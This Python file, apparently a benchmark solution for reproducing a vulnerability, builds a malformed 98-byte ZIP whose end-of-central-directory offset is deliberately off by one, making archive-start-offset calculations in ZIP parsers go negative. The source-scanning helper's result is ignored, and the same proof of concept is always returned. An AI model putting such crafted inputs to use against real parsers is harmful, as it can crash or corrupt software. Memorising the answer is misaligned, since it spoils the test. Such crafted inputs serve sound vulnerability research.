import os
import tarfile
import struct


def _looks_like_zip_project(src_path: str) -> bool:
    keywords = (
        b"archive_start_offset",
        b"archive start offset",
        b"byte_before_the_zipfile",
        b"PK\x03\x04",
        b"PK\x05\x06",
        b"06054b50",
        b"02014b50",
    )
    exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm")
    try:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not lfn.endswith(exts):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        if os.path.getsize(path) > 2_000_000:
                            continue
                        with open(path, "rb") as f:
                            data = f.read()
                        if any(k in data for k in keywords):
                            return True
                    except OSError:
                        continue
            return False

        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not name.endswith(exts):
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                if any(k in data for k in keywords):
                    return True
    except Exception:
        return False
    return False


def _build_zip_negative_archive_start_offset_poc() -> bytes:
    # Layout:
    #   Local File Header (30 bytes)
    #   Central Directory File Header (46 bytes)
    #   End of Central Directory (22 bytes)
    #
    # EOCD's "central directory offset" is set to 31 while actual CD starts at 30,
    # making computed "archive start offset" = -1 in parsers that compensate for SFX prefixes.
    lfh = struct.pack(
        "<IHHHHHIIIHH",
        0x04034B50,  # local file header signature
        20,          # version needed
        0,           # flags
        0,           # compression method
        0,           # mod time
        0,           # mod date
        0,           # crc32
        0,           # compressed size
        0,           # uncompressed size
        0,           # file name length
        0,           # extra field length
    )

    cdfh = struct.pack(
        "<IHHHHHHIIIHHHHHII",
        0x02014B50,  # central directory file header signature
        20,          # version made by
        20,          # version needed
        0,           # flags
        0,           # compression method
        0,           # mod time
        0,           # mod date
        0,           # crc32
        0,           # compressed size
        0,           # uncompressed size
        0,           # file name length
        0,           # extra field length
        0,           # file comment length
        0,           # disk number start
        0,           # internal file attributes
        0,           # external file attributes
        0,           # relative offset of local header
    )

    cd_size = len(cdfh)
    cd_actual_offset = len(lfh)
    cd_claimed_offset = cd_actual_offset + 1  # off by one -> archive_start_offset = -1
    eocd = struct.pack(
        "<IHHHHIIH",
        0x06054B50,  # end of central directory signature
        0,           # number of this disk
        0,           # disk where central directory starts
        1,           # number of central directory records on this disk
        1,           # total number of central directory records
        cd_size,      # size of central directory
        cd_claimed_offset,  # offset of start of central directory
        0,           # zipfile comment length
    )

    return lfh + cdfh + eocd


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Prefer ZIP-shaped PoC; the task description strongly matches ZIP SFX offset logic.
        # Still attempt a quick source scan; if it doesn't look ZIP-related, return the same PoC.
        _ = _looks_like_zip_project(src_path)
        return _build_zip_negative_archive_start_offset_poc()